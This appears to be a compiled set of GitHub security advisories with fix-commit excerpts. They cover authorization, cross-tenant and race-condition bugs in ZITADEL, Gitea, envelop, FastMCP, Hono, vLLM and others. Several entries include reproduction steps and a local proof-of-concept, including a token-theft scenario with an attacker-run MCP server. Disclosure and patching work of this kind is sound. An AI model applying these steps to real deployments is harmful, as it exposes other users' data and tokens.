@@ -1,0 +1,544 @@
+=== GHSA-6x8v-2fq5-2229 sev=low pkgs=['go:github.com/zitadel/zitadel']
+src=https://github.com/zitadel/zitadel cwes=['CWE-284', 'CWE-639']
+SUMMARY:  ZITADEL: Cross-Tenant User Leakage via Recycled Identifiers
+DESC: ### Summary A flaw in the user lifecycle enforcement allowed deleted users to retain their original organization/tenant association. Recreating a deleted user under a distinct organization can cause the new user instance to be incorrectly provisioned within the original organization if the previous ID would be used to recreate it. ### Impact When a user is created, the system maps the generated or provided ID to its target organization (`Org A`). When that user is subsequently deleted, a deletion event is appended to the stream, but the historical mapping of the resource owner within the event store's validation layer is not cleared. If a new user is later provisioned in a different organization (`Org B`) using that exact same ID, the event store validation logic reads the stream's history, matches it to the original organization, and routes the new user's events to `Org A` instead of `Org B`. This issue represents a localized multi-tenancy isolation anomaly rather than an easily exploitable attack vector. Because the new user instance is incorrectly routed and provisioned inside `Org A` instead of `Org B`, an administrator from `Org A` inadvertently gains full access to this new user record. However, there is no technical mechanism for a malicious actor to force, automate, or target this behavior against a specific user or tenant. Because the scenario relies entirely on an accidental sequence of operational events and requires the recycling of a highly specific ID space, the practical security risk is exceptionally low. ### Affected Versions Systems running one of the following versions are affected: * **4.x:** `4.0.0` through `4.15.1` (including RC versions) * **3.x:** `3.0.0` through `3.4.11` (including RC versions) ### Patches The vulnerability has been addressed in the latest releases. The patch resolves the issue by requiring the correct permission in case the verification flag is provided and only allows self-management of the email address, resp. phone number itself. - **4.x**: Upgrade to $\ge$[4.15.2](https://github.com/zitadel/zitadel/releases/tag/v4.15.2) - **3.x**: Update to $\ge$[4.15.2](https://github.com/zitadel/zitadel/releases/tag/v4.15.2) ### Workarounds The recommended solution is to upgrade to a patched version. ### Questions If you have any questions or comments about this advisory, please email us at [security@zitadel.com](mailto:security@zitadel.com) ### Credits Thanks to Charlie Graven from Famedly for reporting this vulnerability.
+FIX commit https://github.com/zitadel/zitadel/commit/6082e59d47c17a9d54a6b0556b3f31559d7c620a status=200
+  MSG: fix(eventstore): allow overwriting resource owner of events (#12261) # Which Problems Are Solved - The eventstore did not support intentionally overwriting the resource owner when creating events for 
+  FILE cmd/initialise/sql/08_events_table.sql
+    -    CREATE TYPE eventstore.command AS (
+    +    CREATE TYPE eventstore.command2 AS (
+    +        , enforce_owner BOOLEAN
+    -CREATE OR REPLACE FUNCTION eventstore.commands_to_events(commands eventstore.command[]) RETURNS SETOF eventstore.events2 VOLATILE AS $$
+    -SELECT
+    -    c.instance_id
+    -    , c.aggregate_type
+    -    , c.aggregate_id
+    -    , c.command_type AS event_type
+    -    , cs.sequence + ROW_NUMBER() OVER (PARTITION BY c.instance_id, c.aggregate_type, c.aggregate_id ORDER BY c.in_tx_order) AS sequence
+    -    , c.revision
+    -    , NOW() AS created_at
+    -    , c.payload
+    -    , c.creator
+    -    , cs.owner
+    -    , EXTRACT(EPOCH FROM NOW()) AS position
+    -    , c.in_tx_order
+    -FROM (
+    -    SELECT
+    +DO $$ BEGIN
+    +    CREATE TYPE eventstore.latest_command AS (
+    +        instance_id TEXT
+    +        , aggregate_type TEXT
+    +        , aggregate_id TEXT
+    +        , owner TEXT
+    +        , sequence BIGINT
+    +    );
+    +EXCEPTION
+    +    WHEN duplicate_object THEN null;
+    +END $$;
+  FILE cmd/setup/40/01_type.sql
+  FILE cmd/setup/40/02_func.sql
+  FILE cmd/setup/64.go
+  FILE cmd/setup/64.sql
+  FILE cmd/setup/70.go
+  FILE cmd/setup/70.sql
+  FILE cmd/setup/config.go
+  FILE cmd/setup/setup.go
+  FILE internal/command/group_model.go
+  FILE internal/command/metadata_model.go
+  FILE internal/command/org_action_model.go
+  FILE internal/command/org_domain_model.go
+  FILE internal/command/org_metadata_model.go
+  FILE internal/command/project_application_api_model.go
+  FILE internal/command/project_application_key_model.go
+  FILE internal/command/project_application_model.go
+  FILE internal/command/project_application_oidc_model.go
+  FILE internal/command/project_application_saml_model.go
+  FILE internal/command/project_application_secret_model.go
+
+=== GHSA-qf2f-qh6p-7v89 sev=medium pkgs=['go:code.gitea.io/gitea']
+src=https://github.com/go-gitea/gitea cwes=['CWE-863']
+SUMMARY: Gitea CVE-2026-20800 sibling endpoints not covered: revoked user still reads private repo objects via `/api/v1/user/starred` and private issue titles via `/api/v1/user/times`
+DESC: ## Summary CVE-2026-20800 fixed private-info leakage to revoked users only for the notification endpoint. Two sibling endpoints that return data keyed on the caller's own relationship still do not re-check repo access at output time: - `GET /api/v1/user/starred` — `getStarredRepos()` computes a per-repo permission but still lists every starred repo (no filtering), so the full repo object (`full_name`, `private`, `clone_url`, `ssh_url`) of a now-inaccessible private repo is returned. - `GET /api/v1/user/times` — `ListMyTrackedTimes()` queries by `UserID` only and `LoadAttributes` brings in the issue (`title`, `state`), leaking private issue titles after revocation. ## Steps to reproduce Using the provided reproduction materials, as a revoked user: 1. Control: `GET /api/v1/repos/admin/starred-test` → **404**. 2. `GET /api/v1/user/starred` → leaks `admin/starred-test`, `private:true`, `clone_url`. 3. `GET /api/v1/user/times` → leaks `issue.title = "SECRET: …"`, `state`. (Runtime-confirmed on `gitea/gitea:1.25.4`. Oracle = planted sentinel title; no real secret exfiltrated.) ## Impact A former collaborator can enumerate private repos they starred and read private issue titles they logged time on, indefinitely after access revocation. Metadata only (no repo content / comment bodies). Low. ## Suggested remediation 1. `getStarredRepos`: drop (or minimally redact) repos where `permission.HasAnyUnitAccessOrPublicAccess()` is false for the caller. 2. `ListMyTrackedTimes`: filter tracked-time entries by current repo access. 3. Optionally clear a user's stars / time entries for a private repo on revocation. ## Credit Reported as part of an incomplete-patch measurement study (responsible disclosure).
+
+=== GHSA-h3hw-29fv-2x75 sev=high pkgs=['npm:@envelop/graphql-modules']
+src=https://github.com/graphql-hive/envelop cwes=['CWE-362']
+SUMMARY: @envelop/graphql-modules has a Race Condition vulnerability
+DESC: ### Summary Context race condition when using `useGraphQLModules` plugin ### Details Related to: https://github.com/graphql-hive/graphql-modules/security/advisories/GHSA-53wg-r69p-v3r7 When 2 or more parallel requests are made which trigger the same service, the context of the requests is mixed up in the service when the context is injected via @ExecutionContext() and graphql-modules are used in Yoga with `useGraphQLModules(application)`. This issue was fixed in `graphql-modules` in `2.4.1` and `3.1.1` but using `useGraphQLModules` will bypass the `async_hooks` fix that was implemented. ### PoC Create the following `package.json` and run `npm i` ```json { "name": "poc", "scripts": { "compile": "tsc", "start": "npm run compile && node ./dist/src/index.js", "test": "npm run compile && node ./dist/test/bleedtest.js" }, "dependencies": { "@envelop/graphql-modules": "^9.0.0", "graphql-yoga": "^5.0.0", "graphql": "^16.10.0", "graphql-modules": "3.1.1", "reflect-metadata": "0.2.1", "axios": "^1.8.4" }, "devDependencies": { "@types/node": "^22.14.1", "typescript": "^5.8.3" } } ``` Define the app entrypoint: `src/index.ts` ```ts import { module } from "./module.js"; import { useGraphQLModules } from '@envelop/graphql-modules' import { createApplication } from "graphql-modules"; import { createServer } from 'node:http' import { randomUUID } from "node:crypto"; import { createYoga } from 'graphql-yoga'; const application = createApplication({ modules: [module] }) const yoga = createYoga({ schema: application.schema, plugins: [useGraphQLModules(application)], context() { return { requestId: randomUUID(), } } }) const server = createServer(yoga) server.listen(4001, '127.0.0.1', undefined, () => { console.info( `[Server] Running on http://localhost:4001/graphql` ) }) ``` Create the test module: `src/module.ts` ```ts import { createModule, gql } from "graphql-modules"; import Service from "./service.js"; const typeDefs = gql` type Book { id1: String id2: String } type Query { books: [Book] } `; export const module = createModule({ id: 'book-module', typeDefs: [typeDefs], providers: [Service], resolvers: { Query: { // return one empty book books: () => [{}], }, Book: { // return the requestId from the context id1: async (_root, _args, { injector } ) => { return injector.get(Service).get(); }, // return the requestId from the context of the service 100 ms later id2: async (_root, _args, { injector } ) => { await new Promise(resolve => setTimeout(resolve, 100)); return injector.get(Service).get() }, } } }) ``` Add the Service that's to be injected `src/service.ts` ```ts import { ExecutionContext, Injectable } from 'graphql-modules'; import 'reflect-metadata'; @Injectable() export default class Service { @ExecutionContext() private context: ExecutionContext; get() { return this.context.requestId; } } ``` Add the test case `test/bleedtest.js` ```ts import axios from 'axios'; const url = 'http://localhost:4001/graphql'; const query = `query { books { id1 id2 } }`; const makeGraphQLRequest = async () => { const response = await axios.post(url, { query }); const book = response.data.data.books[0] if (book.id1 !== book.id2) { throw new Error(`wrong response with ids ${(book.id1)} and ${(book.id2)}`) } } const numberOfRequests = 2; await Promise.all(Array.from( { length: numberOfRequests }, makeGraphQLRequest, )); ``` Then run the server with `npm run start` in one terminal and the testcase in another with `npm run test`. The returned IDs should be identical as they are both read from the context within the same request. However, there is a mismatch: ``` ❯ npm run test > poc@1.0.0 test > npm run compile && node ./dist/test/bleedtest.js > poc@1.0.0 compile > tsc file://<redacted>/dist/test/bleedtest.js:8 throw new Error(`wrong response with ids ${(book.id1)} and ${(book.id2)}`); ^ Error: wrong response with ids c2d83151-0922-4f25-a3e9-2f03acc1376a and e16c7335-0eaa-4386-b415-869ee4b05315 at makeGraphQLRequest (file://<redacted>/dist/test/bleedtest.js:8:15) at process.processTicksAndRejections (node:internal/process/task_queues:95:5) at async Promise.all (index 0) at async file://<redacted>/dist/test/bleedtest.js:12:1 ``` ### Impact Any application that uses `useGraphQLModules` from `@envelop/graphql-modules` along with services that inject the context using @ExecutionContext() from a singleton provider are at risk. The more traffic an application has, the higher the chance for parallel requests, the higher the risk.
+FIX commit https://github.com/graphql-hive/envelop/commit/ab49fa259a51d976c437e084114e070b99720ba9 status=200
+  MSG: graphql-modules plugin: Bind context to async execution avoiding race-conditions (#2843)
+  FILE .changeset/polite-baths-stop.md
+    +---
+    +'@envelop/graphql-modules': patch
+    +---
+    +Bind context to async execution avoiding race-conditions
+  FILE packages/plugins/graphql-modules/src/index.ts
+    -import type { Plugin, TypedExecutionArgs } from '@envelop/core';
+    -const graphqlModulesControllerSymbol = Symbol('GRAPHQL_MODULES');
+    -function destroy(context: TypedExecutionArgs<any>) {
+    -  if (context.contextValue?.[graphqlModulesControllerSymbol]) {
+    -    context.contextValue[graphqlModulesControllerSymbol].destroy();
+    -    context.contextValue[graphqlModulesControllerSymbol] = null;
+    -  }
+    -}
+    +import type { Plugin } from '@envelop/core';
+    -    onContextBuilding({ extendContext, context }) {
+    -      const controller = app.createOperationController({
+    -        context,
+    -        autoDestroy: false,
+    -      });
+    -      extendContext({
+    -        ...controller.context,
+    -        [graphqlModulesControllerSymbol]: controller,
+    -      });
+    -    },
+    -    onExecute({ args }) {
+    -      return {
+    -        onExecuteDone() {
+    -          destroy(args);
+    -        },
+    -      };
+    +    onExecute({ setExecuteFn, executeFn }) {
+  FILE packages/plugins/graphql-modules/test/use-graphql-modules.spec.ts
+  FILE scripts/match-graphql.js
+
+=== GHSA-w2fm-25vw-vh7f sev=high pkgs=['npm:mcp-handler']
+src=https://github.com/vercel/mcp-handler cwes=['CWE-362', 'CWE-1395']
+SUMMARY: mcp-handler has a tool response leak across concurrent client sessions ('Race Condition')
+DESC: `mcp-handler` versions prior to 1.1.0 accepted `@modelcontextprotocol/sdk` < 1.26.0 as a peer dependency. That SDK version contains a vulnerability [[CVE-2026-25536](https://nvd.nist.gov/vuln/detail/CVE-2026-25536)] that causes concurrent requests from different clients to share server-side state including authentication context and tool execution results when a `StreamableHTTPServerTransport` instance is reused across requests. **Note:** This is _not_ a vulnerability in `mcp-handler` itself. The root cause is in the peer dependency `@modelcontextprotocol/sdk`. ### Impact A low-privileged attacker making concurrent requests to an `mcp-handler` endpoint can read another client's session data, including authentication information and tool execution state. This is a confidentiality breach with potential for limited integrity impact. **Root Cause:** [CVE-2026-25536](https://nvd.nist.gov/vuln/detail/CVE-2026-25536) in `@modelcontextprotocol/sdk` < 1.26.0. The SDK did not prevent reuse of stateless transports across client connections. ### Patches Upgrade to `mcp-handler@1.1.0`. This release raises the minimum peer dependency to `@modelcontextprotocol/sdk@>=1.26.0`, which contains the fix for CVE-2026-25536. ### Workarounds - Upgrade `@modelcontextprotocol/sdk` to `>=1.26.0` (note: the SDK will throw on transport reuse, which will break `mcp-handler` < 1.1.0 which effectively forces the upgrade) - Alternatively, manually create fresh `McpServer` and transport instances per request in your handler code
+
+=== GHSA-q658-hfpg-35qc sev=medium pkgs=['go:github.com/forceu/gokapi']
+src=https://github.com/Forceu/Gokapi cwes=['CWE-284']
+SUMMARY: Gokapi has privilege escalation via incomplete API-key permission revocation on user rank demotion
+DESC: ### Summary A privilege escalation vulnerability in the user rank demotion logic allows a demoted user's existing API keys to retain ApiPermManageFileRequests and ApiPermManageLogs permissions, enabling continued access to upload-request management and log viewing endpoints after the user has been stripped of all privileges. ### Impact Any user who previously held Admin rank and had API keys with ApiPermManageFileRequests or ApiPermManageLogs retains those capabilities after demotion. This allows offboarded or demoted users to: - Create, list, and delete upload requests - Read application logs and system status
+
+=== GHSA-xg36-8c2v-jpxh sev=medium pkgs=['composer:magento/community-edition']
+src=https://github.com/magento/magento2 cwes=['CWE-863']
+SUMMARY: Magento Open Source Incorrect Authorization vulnerability
+DESC: Magento Open Source versions 2.4.7-p2, 2.4.6-p7, 2.4.5-p9, 2.4.4-p10 and earlier are affected by an Incorrect Authorization vulnerability that could result in a security feature bypass. A low-privileged attacker could exploit this vulnerability to have a low impact on integrity. Exploitation of this issue does not require user interaction.
+
+=== GHSA-jj94-6f5c-65r8 sev=high pkgs=['go:github.com/zitadel/zitadel/v2']
+src=https://github.com/zitadel/zitadel cwes=['CWE-200', 'CWE-672']
+SUMMARY: ZITADEL Allows Unauthorized Access After Organization or Project Deactivation
+DESC: ### Summary In Zitadel, even after an organization is deactivated, associated projects, respectively their applications remain active. Users across other organizations can still log in and access through these applications, leading to unauthorized access. Additionally, if a project was deactivated access to applications was also still possible. ### Details The issue stems from the fact that when an organization is deactivated in Zitadel, the applications associated with it do not automatically deactivate. The application lifecycle is not tightly coupled with the organization's lifecycle, leading to a situation where the organization or project is marked as inactive, but its resources remain accessible. ### PoC - Create a new Organization, create new project and setup OpenID connect. - Deactivate an Organization - Setup authentication without selecting Check for Project on Authentication - User is able to login despite the organization is deactivated ### Impact This vulnerability allows for unauthorized access to projects and their resources, which should have been restricted post-organization deactivation. ### Patches 2.x versions are fixed on >= [2.62.1](https://github.com/zitadel/zitadel/releases/tag/v2.62.1) 2.61.x versions are fixed on >= [2.61.1](https://github.com/zitadel/zitadel/releases/tag/v2.61.1) 2.60.x versions are fixed on >= [2.60.2](https://github.com/zitadel/zitadel/releases/tag/v2.60.2) 2.59.x versions are fixed on >= [2.59.3](https://github.com/zitadel/zitadel/releases/tag/v2.59.3) 2.58.x versions are fixed on >= [2.58.5](https://github.com/zitadel/zitadel/releases/tag/v2.58.5) 2.57.x versions are fixed on >= [2.57.5](https://github.com/zitadel/zitadel/releases/tag/v2.57.5) 2.56.x versions are fixed on >= [2.56.6](https://github.com/zitadel/zitadel/releases/tag/v2.56.6) 2.55.x versions are fixed on >= [2.55.8](https://github.com/zitadel/zitadel/releases/tag/v2.55.8) 2.54.x versions are fixed on >= [2.54.10](https://github.com/zitadel/zitadel/releases/tag/v2.54.10) ### Workaround Unpatched versions can explicitly disable the application to make sure the client is not allowed anymore. ### Questions If you have any questions or comments about this advisory, please email us at [security@zitadel.com](mailto:security@zitadel.com) ### Credits Thanks to @prdp1137 for reporting this!
+
+=== GHSA-5h2m-4q8j-pqpj sev=high pkgs=['pip:fastmcp']
+src=https://github.com/PrefectHQ/fastmcp cwes=['CWE-863']
+SUMMARY: FastMCP OAuth Proxy token reuse across MCP servers
+DESC: While testing the OAuth Proxy implementation, it was noticed that the server does not properly respect the `resource` parameter submitted by the client in the authorization and token request. Instead of issuing the token explicitly for this MCP server, the token is issued for the `base_url` passed to the `OAuthProxy` during initialization. **Affected File:** *https://github.com/jlowin/fastmcp/blob/main/src/fastmcp/server/auth/oauth_proxy.py#L828* **Affected Code:** ```python self._jwt_issuer: JWTIssuer = JWTIssuer( issuer=str(self.base_url), audience=f"{str(self.base_url).rstrip('/')}/mcp", signing_key=jwt_signing_key, ) ``` Since the issued access and refresh tokens do not include information about the resource the token was issued for, it is impossible for the MCP server to properly verify whether the token was issued for it, hence violating the requirement of doing so demanded by the [specification](https://mcp.mintlify.app/specification/2025-11-25/basic/authorization#token-audience-binding-and-validation). Being able to verify whether the token was issued for the target MCP server enforces the protections offered by the steps proposed by the specification and the Resource Indicators OAuth extension. Therefore, this misconfiguration exposes all MCP server setups using the FastMCP OAuth Proxy to an attack where an adversary creates a malicious MCP server that advertises the benign OAuth Proxy authorization server as its own authorization server. Once a victim completes an OAuth flow with this malicious MCP server, authenticating against the AS, the adversary can extract the token received at the malicious MCP server and use it to access other MCP servers (the benign ones) that also use the same AS, including the tools and resources they expose. **Steps to reproduce:** 1. Extract the provided [PoC environment](https://github.com/user-attachments/files/23839983/improper_resource_validation_fastmcp.tgz). 2. Enter the *client_id* and *client_secret* of a GitHub App you control into the `mcp-server-proxy.py` script. 3. Start the benign MCP server using an OAuth Proxy (in this case the *GitHubProvider*): `python3 mcp-server-proxy.py`. 4. Start the malicious AS: `python3 mal_auth_server.py`. 5. Start the malicious MCP server: `python3 attacker_server.py`. 6. Connect the client to the malicious MCP server: `python3 client.py`. 7. Complete the OAuth flow. 8. Observe in the logs of the malicious MCP server that the request to the benign MCP server with the stolen token returned a 200 status code. ## Impact This vulnerability allows an adversary to steal a victim’s authentication material for a benign MCP server using the FastMCP OAuth Proxy. The severity of this issue was decreased to _Medium_ due to the consent screen showing the name of the MCP server the OAuth Proxy was intended for. However, a victim might not see it or get otherwise convinced by the attacker to ignore it, and overall this does not act as a proper mitigation for this issue. ## Mitigation To mitigate this vulnerability, it is recommended to issue tokens specifically for the MCP server submitted in the authorization URL’s `resource` GET parameter. In this way, the receiving MCP server will be able to properly verify that the token was indeed issued for it, allowing it to reject tokens stolen by an attack like the one demonstrated above.
+
+=== GHSA-f23p-vx2j-j53r sev=medium pkgs=['npm:hono']
+src=https://github.com/honojs/hono cwes=['CWE-488']
+SUMMARY: Hono: `memo()` retains SSR output across requests, leading to cross-user data disclosure
+DESC: ### Summary `memo()` from `hono/jsx` retains the result of a server-side render and reuses it for later renders with comparator-equal props. Request-scoped values read inside the component take no part in that comparison, so a response can contain HTML rendered for another user's request. ### Details Components wrapped with `memo()` are compared by props alone. Values read implicitly during rendering do not participate: JSX Context through `createContext()` and `useContext()`, `useRequestContext()` from `hono/jsx-renderer`, and `getContext()` from `hono/context-storage`. The retained result lives as long as the wrapped component, so it outlives the request that produced it. Per-request context isolation is not what fails: the current request's values are established correctly, but the memoized component is skipped before anything reads them. This issue arises when a component wrapped in `memo()` obtains user- or request-specific data from an ambient context instead of through props. ### Impact A user may receive a response containing HTML rendered for another user, when both render the same memoized component with comparator-equal props on the same warm instance. This may lead to: - Disclosure of another user's account or profile data - Disclosure of request-scoped secrets embedded in HTML, such as CSRF tokens - Exposure of role-specific content to users who should not receive it Exploitation depends on the order in which renders populate the retained value and on both requests reaching the same warm instance. This issue affects applications that render with `hono/jsx` on the server and wrap a component reading ambient request state in `memo()`. Applications that pass all request-specific values through props, or that do not use `memo()`, are unaffected. Client-side rendering is unaffected.
+FIX commit https://github.com/honojs/hono/commit/0c45036d6b0ddf42ab2fa44639dc8710825d5c0f status=200
+  MSG: Merge commit from fork
+  FILE src/jsx/base.ts
+    -  let computed: ReturnType<FC<T>> = null
+    -  let prevProps: T | undefined = undefined
+    -  const wrapper: MemorableFC<T> = ((props: T) => {
+    -    if (prevProps && !propsAreEqual(prevProps, props)) {
+    -      computed = null
+    -    }
+    -    prevProps = props
+    -    return (computed ||= component(props))
+    -  }) as MemorableFC<T>
+    +  const wrapper: MemorableFC<T> = ((props: T) => component(props)) as MemorableFC<T>
+  FILE src/jsx/index.test.tsx
+    +import { DOM_MEMO } from './constants'
+    -  it('memoized', () => {
+    +  it('does not reuse the result of a previous render', () => {
+    -      '<html><head><title>Test Site 0</title></head><body><span>1</span></body></html>'
+    +      '<html><head><title>Test Site 1</title></head><body><span>1</span></body></html>'
+    +  it('does not carry a context value into a later render', () => {
+    +    const NameContext = createContext('anonymous')
+    +    const Panel = memo(() => <p>{useContext(NameContext)}</p>)
+    +    const render = (name: string) =>
+    +      (
+    +        <NameContext.Provider value={name}>
+    +          <Panel />
+    +        </NameContext.Provider>
+    +      ).toString()
+    +    expect(render('alice')).toBe('<p>alice</p>')
+    +    expect(render('bob')).toBe('<p>bob</p>')
+    +  })
+    -  it('custom propsAreEqual', () => {
+    -    const Body = memo(
+    -      ({ counter }: { counter: number; refresh?: boolean }) => <span>{counter}</span>,
+
+=== GHSA-v8qf-fr4g-28p2 sev=low pkgs=['npm:openclaw']
+src=https://github.com/openclaw/openclaw cwes=['CWE-863']
+SUMMARY: OpenClaw: Assistant media route missed scope enforcement for trusted-proxy authorization
+DESC: ## Affected Packages / Versions - Package: `openclaw` (npm) - Affected versions: `< 2026.4.20` - Patched version: `2026.4.20` ## Impact The Control UI assistant-media route authenticated trusted-proxy callers but did not enforce the declared operator scopes for identity-bearing HTTP auth paths. A trusted-proxy caller without `operator.read` could access assistant-media files and metadata that were otherwise inside allowed media roots. The route still required successful gateway authentication and media-root checks. Severity is low. ## Fix Assistant-media file and metadata requests now require `operator.read` on identity-bearing HTTP auth paths. Fix commit: - `99ef3a63c58440d53f8e45ad861b846032fcb036` ## Release Fixed in OpenClaw `2026.4.20`.
+FIX commit https://github.com/openclaw/openclaw/commit/99ef3a63c58440d53f8e45ad861b846032fcb036 status=200
+  MSG: fix(gateway): require read scope for assistant media (#68175) * fix(gateway): enforce assistant media scopes * changelog: require read scope for assistant media (#68175) * skip scope enforcement for a
+  FILE CHANGELOG.md
+    +- Gateway/assistant media: require `operator.read` scope for assistant-media file and metadata requests on identity-bearing HTTP auth paths so callers without 
+  FILE src/gateway/control-ui.http.test.ts
+    +  it("rejects trusted-proxy assistant media file reads without operator.read scope", async () => {
+    +    await withAllowedAssistantMediaRoot({
+    +      prefix: "ui-media-scope-file-",
+    +      fn: async (tmpRoot) => {
+    +        const filePath = path.join(tmpRoot, "photo.png");
+    +        await fs.writeFile(filePath, Buffer.from("not-a-real-png"));
+    +        const { res, handled, end } = await runAssistantMediaRequest({
+    +          url: `/__openclaw__/assistant-media?source=${encodeURIComponent(filePath)}`,
+    +          method: "GET",
+    +          auth: {
+    +            mode: "trusted-proxy",
+    +            allowTailscale: false,
+    +            trustedProxy: {
+    +              userHeader: "x-forwarded-user",
+    +            },
+    +          },
+    +          trustedProxies: ["10.0.0.1"],
+    +          remoteAddress: "10.0.0.1",
+    +          headers: {
+    +            host: "gateway.example.com",
+    +            "x-forwarded-user": "nick@example.com",
+    +            "x-forwarded-proto": "https",
+    +            "x-openclaw-scopes": "operator.approvals",
+    +          },
+    +        });
+    +        expect(handled).toBe(true);
+    +        expect(res.statusCode).toBe(403);
+    +        expect(JSON.parse(String(end.mock.calls[0]?.[0] ?? ""))).toMatchObject({
+    +          ok: false,
+  FILE src/gateway/control-ui.ts
+  FILE src/gateway/method-scopes.ts
+
+=== GHSA-2phq-3phc-84px sev=medium pkgs=['pip:vllm']
+src=https://github.com/vllm-project/vllm cwes=['CWE-639']
+SUMMARY: vLLM: Flash late-interaction scoring caches query embeddings under a caller-controlled request id — cross-request integrity break and induced errors on `/score` and `/rerank`
+DESC: ## Affected - **Ecosystem / package:** pip / `vllm` - **Affected versions:** vLLM ≤ 0.25.1 (confirmed on 0.25.1, commit [`752a3a504485`](https://github.com/vllm-project/vllm/tree/752a3a504485790a2e8491cacbb35c137339ad34)). The lower bound predates 0.25.1; maintainers can confirm how far back the flash late-interaction query cache reaches. ## Summary On late-interaction `/score` and `/rerank` deployments with flash late interaction enabled (the default for supported models), the worker caches per-request query embeddings under a key derived from the **caller-controlled** `X-Request-Id` header. A second concurrent request that reuses the victim's header value replaces the victim's cached query embedding before document scoring — so the victim's documents are scored against the **attacker's** query. Because the data-parallel router pins all requests sharing a cache key to the same engine, the collision is deterministic for an attacker who reuses the victim's `X-Request-Id`. Depending on timing, one request can also consume the shared use counter and force the other request into a late-interaction cache-miss error. This is a remotely reachable, request-controlled cross-request integrity break on the standard scoring and reranking endpoints. It requires only that flash late interaction be enabled, which is the default for supported models. ## Affected code Links pinned to the confirmed commit [`752a3a504485`](https://github.com/vllm-project/vllm/tree/752a3a504485790a2e8491cacbb35c137339ad34) (v0.25.1): - [`vllm/entrypoints/serve/engine/serving.py#L117-L124`](https://github.com/vllm-project/vllm/blob/752a3a504485790a2e8491cacbb35c137339ad34/vllm/entrypoints/serve/engine/serving.py#L117-L124) — `_base_request_id()` copies the public `X-Request-Id` header directly. - [`vllm/entrypoints/pooling/base/serving.py#L109`](https://github.com/vllm-project/vllm/blob/752a3a504485790a2e8491cacbb35c137339ad34/vllm/entrypoints/pooling/base/serving.py#L109) — the frontend request id is `f"{self.request_id_prefix}-{self._base_request_id(raw_request)}"`. - [`vllm/entrypoints/pooling/scoring/serving.py#L211`](https://github.com/vllm-project/vllm/blob/752a3a504485790a2e8491cacbb35c137339ad34/vllm/entrypoints/pooling/scoring/serving.py#L211) — `flash_late_interaction()` (at [L191](https://github.com/vllm-project/vllm/blob/752a3a504485790a2e8491cacbb35c137339ad34/vllm/entrypoints/pooling/scoring/serving.py#L191)) derives worker cache keys directly from that id: `query_keys = [f"{ctx.request_id}-query-{i}" for i in range(n_queries)]`. - [`vllm/v1/pool/late_interaction.py#L30-L36`](https://github.com/vllm-project/vllm/blob/752a3a504485790a2e8491cacbb35c137339ad34/vllm/v1/pool/late_interaction.py#L30-L36) — the data-parallel routing helper pins all requests sharing a `query_key` to the same engine via `crc32(query_key)`, making collisions deterministic. - [`vllm/v1/worker/gpu/pool/late_interaction_runner.py#L95`](https://github.com/vllm-project/vllm/blob/752a3a504485790a2e8491cacbb35c137339ad34/vllm/v1/worker/gpu/pool/late_interaction_runner.py#L95) — the worker stores query embeddings in a process-local cache keyed only by that string: `self._query_cache[query_key] = output.clone()`. The caller-controlled header enters as the request id, and the flash late-interaction path derives the worker cache key directly from it: ```python # vllm/entrypoints/serve/engine/serving.py Lines 116-126 @staticmethod def _base_request_id( raw_request: Request | None, default: str | None = None ) -> str | None: """Pulls the request id to use from a header, if provided""" if raw_request is not None and ( (req_id := raw_request.headers.get("X-Request-Id")) is not None ): return req_id return random_uuid() if default is None else default ``` ```python # vllm/entrypoints/pooling/scoring/serving.py Lines 207-212 n_queries = ctx.n_queries n_docs = len(ctx.engine_inputs) - n_queries query_engine_inputs = ctx.engine_inputs[:n_queries] query_keys = [f"{ctx.request_id}-query-{i}" for i in range(n_queries)] query_uses = [n_docs if n_queries == 1 else 1] * n_queries ``` The worker then stores and reads the query embedding under that string with no check that the reader owns the entry — a colliding key returns another request's cached query, or (once the use counter is exhausted) raises a cache-miss error: ```python # vllm/v1/worker/gpu/pool/late_interaction_runner.py Lines 91-107 if mode == LATE_INTERACTION_MODE_CACHE_QUERY: assert query_uses is not None # `output` can be a view into the current step's hidden-states # buffer, so clone it before storing across scheduling steps. self._query_cache[query_key] = output.clone() self._query_uses[query_key] = query_uses outputs[i] = torch.zeros((), device=output.device, dtype=torch.float32) continue if mode == LATE_INTERACTION_MODE_SCORE_DOC: query_output = self._query_cache.get(query_key) if query_output is None: raise ValueError( "late-interaction query cache miss for key " f"{query_key!r}. Ensure query requests are executed " "before their paired document requests." ) ``` The bug is specific to the flash late-interaction path. Non-flash late-interaction scoring computes MaxSim directly from one request's in-memory outputs and does not create a cross-request worker cache key. ## Impact A network client of the standard scoring API can, on a flash late-interaction `/score` or `/rerank` deployment: 1. **Corrupt another user's results** — by reusing the victim's `X-Request-Id`, the attacker's query embedding overwrites the victim's cached entry, so the victim's documents are scored against the attacker's query (a cross-request integrity break). 2. **Induce errors** — depending on timing, one request consumes the shared use counter and forces the other request into a late-interaction cache-miss error. Both consequences follow deterministically from reusing the victim's header value, because same-key work is pinned to one engine. This is reachable through normal request handling and does not depend on any trus [...]
+FIX pull https://github.com/vllm-project/vllm/pull/51445 status=200
+  PR: [Frontend] Use server-generated keys for late-interaction query caches | # Use server-generated keys for late-interaction query caches ## What this fixes Flash late-interaction scoring used the caller-controlled `X-Request-Id` header in its temporary query-cache key. Two concurrent requests using the same header therefore used the same cache entry. For example, a victim and another client could both send `/score` with `X-Request-Id: shared-id`, but with different queri
+  MSG: Use server-generated keys for late-interaction query caches (#51445) Co-authored-by: Lucas Bourtoule <35483370+dhalf@users.noreply.github.com>
+  FILE tests/entrypoints/pooling/scoring/test_late_interaction_serving.py
+    +# SPDX-License-Identifier: Apache-2.0
+    +# SPDX-FileCopyrightText: Copyright contributors to the vLLM project
+    +from unittest.mock import AsyncMock, Mock
+    +import pytest
+    +from vllm.entrypoints.pooling.scoring.serving import ServingScores
+    +from vllm.entrypoints.pooling.typing import PoolingServeContext
+    +from vllm.inputs import tokens_input
+    +from vllm.pooling_params import PoolingParams
+    +def _make_context() -> PoolingServeContext:
+    +    return PoolingServeContext(
+    +        request=Mock(),
+    +        model_name="model",
+    +        request_id="score-caller-controlled-id",
+    +        pooling_params=PoolingParams(task="token_embed"),
+    +        lora_request=None,
+    +        priorities=None,
+    +        prompt_extras=None,
+    +        engine_inputs=[
+    +            tokens_input(prompt_token_ids=[1]),
+    +            tokens_input(prompt_token_ids=[2]),
+    +        ],
+    +        n_queries=1,
+    +    )
+    +def _query_key(context: PoolingServeContext) -> str:
+    +    assert context.engine_inputs is not None
+    +    pooling_params = context.engine_inputs[0]["params"]
+    +    late_interaction_params = pooling_params.late_interaction_params
+    +    assert late_interaction_params is not None
+    +    query_key = late_interaction_params.query_key
+    +    assert query_key is not None
+  FILE vllm/entrypoints/pooling/scoring/serving.py
